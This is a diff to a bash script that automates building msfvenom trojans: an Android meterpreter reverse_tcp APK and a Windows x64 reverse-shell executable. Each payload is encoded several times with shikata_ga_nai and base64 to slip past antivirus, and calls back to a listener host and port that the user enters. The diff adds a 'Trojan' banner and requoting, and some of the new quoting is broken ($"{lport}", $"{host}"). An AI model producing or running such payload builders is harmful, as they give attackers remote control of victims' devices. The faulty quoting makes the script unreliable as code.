@@ -23,8 +23,15 @@ else
 	exit 1
 fi
 
-#echo   '*********   ********'
-#echo '**********     *********'
+echo   '*********   ********'
+echo  '*********     *********'
+echo '*********       *********'
+echo '********  Trojan *********'
+echo '********         *********'
+echo '*********       *********'
+echo  '*********     *********'
+echo   '*********   ********'
+
 sleep 3s  
 
 echo "This script creates automatically payload using MSFVENOM"
@@ -57,10 +64,10 @@ if [ ${os} = "1" ]; then
 	sleep 0.3
 	echo -n "Enter your Port number => "
 	read port
-	$(sudo msfvenom -p android/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload1.apk)
-	$(sudo msfvenom -x .payload1.apk --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload2.apk)
-	$(sudo msfvenom -x .payload2.apk --encoder ruby/base64 -i 3 --arch dalvik --platform android LHOST=${lhost} LPORT=${lport} --out ${name}.apk)
-	$(rm -rf .payload1.apk .payload2.apk)
+	sudo msfvenom -p android/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload1.apk
+	sudo msfvenom -x .payload1.apk --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload2.apk
+	sudo msfvenom -x .payload2.apk --encoder ruby/base64 -i 3 --arch dalvik --platform android LHOST="${lhost}" LPORT=$"{lport}" --out "${name}".apk
+	rm -rf .payload1.apk .payload2.apk
 elif [ ${os} = "2" ]; then
 	echo -n "What name you would like to give to the Windows payload => "
 	read name 
@@ -70,11 +77,11 @@ elif [ ${os} = "2" ]; then
 	sleep 0.3
 	echo -n "Enter your Port number => "
 	read port
-	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -o .windows.exe
-	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows.exe  -o .windows1.exe
-	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows1.exe -o .windows2.exe
-	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows2.exe -o ${name}.exe
-	$(rm -rf .windows.exe .windows1.exe .windows2.exe)
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=$"{host}" LPORT="${port}" -i -20 -f exe -o .windows.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST="${host}" LPORT="${port}" -i -20 -f exe -x .windows.exe  -o .windows1.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST="${host}" LPORT="${port}" -i -20 -f exe -x .windows1.exe -o .windows2.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST="${host}" LPORT="${port}" -i -20 -f exe -x .windows2.exe -o "${name}".exe
+	rm -rf .windows.exe .windows1.exe .windows2.exe
 #elif [ ${os} = "3" ]; then
 	#echo -n "What name you would like to give to the Linux payload => "
 	#read name 
@@ -89,6 +96,7 @@ elif [ ${os} = "2" ]; then
 	#echo "Please go to msfconsole to continue start your session"
 	#echo "Good Day"
 else
-	echo "Error"
+	echo "Error creating Payload"
+	echo -e "\033[31mPlease Try again later! \033[0m"
 fi
 
